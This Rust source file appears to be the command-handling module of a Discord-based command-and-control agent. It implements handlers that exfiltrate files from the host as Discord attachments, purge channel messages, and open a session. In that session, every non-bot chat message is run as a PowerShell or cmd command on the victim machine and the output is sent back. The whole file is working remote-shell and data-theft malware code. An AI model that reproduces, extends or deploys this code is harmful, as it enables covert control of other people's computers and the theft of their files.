use anyhow::{Error};
use serenity::{
    client::Context,
    model::application::interaction::{InteractionResponseType, application_command::ApplicationCommandInteraction},
};

use crate::commands::sessions::session;
use crate::ephemeral_interaction_create;
use crate::errors::DiscordC2Error;
use serenity::model::channel::Message;
use lazy_static::lazy_static;
use tokio::sync::Mutex;
use crate::os::process_handler::ProcessHandler;
lazy_static! {
    static ref SHELL_TYPE: Mutex<Option<String>> = Mutex::new(None);
}

pub mod exfiltrate;
pub mod info;
pub mod purge;
pub mod sessions;

pub async fn handle_exfiltrate(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), Error> {
    let attachment = exfiltrate::run(&command.data.options).await;

    command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| {
                    if let Some(att) = attachment {
                        message.content("Successfully exfiltrated!");
                        message.add_file(att);
                    } else {
                        message.content("Failed to exfiltrate :(");
                    }

                    message
                })
        })
        .await?;
    Ok(())
}

pub async fn handle_purge(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), Error> {
    let content = purge::run(&ctx, &command.channel_id).await;
    ephemeral_interaction_create(ctx, command, &content).await?;
    Ok(())
}


pub async fn handle_session(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), Error> {
    let (content, shell) = session::run(&ctx, &command.data.options).await?;
    ephemeral_interaction_create(&ctx, command, &content).await?;

    let shell_type = shell.ok_or(DiscordC2Error::AgentError("Shell was not properly created".parse().unwrap()))?;

    // Store shell_type in the global variable
    *SHELL_TYPE.lock().await = Some(shell_type);

    Ok(())
}

pub async fn handle_command(ctx: &Context, message: &Message) -> Result<(), Error> {
    let shell_type = SHELL_TYPE.lock().await.clone().unwrap();
    let shell = ProcessHandler::instance(&shell_type).await?;

    println!("Command: {:?}", message.content);

    if !message.author.bot {
        if message.content == "exit" {
            shell.exit().await?;
            if let Err(why) = message.channel_id.say(&ctx.http, "Successfully exited session. Use /exit to close the channel.").await {
                println!("Error sending message: {:?}", why);
            }

        } else {
            let output = shell.run_command(&message.content).await?;
            let mut formatted = String::new();

            if shell.shell_type == "powershell.exe" {
                formatted = format!("```powershell\n{}```", output);
            } else {
                formatted = format!("```cmd\n{}```", output);
            }

            if let Err(why) = message.channel_id.say(&ctx.http, &formatted).await {
                println!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}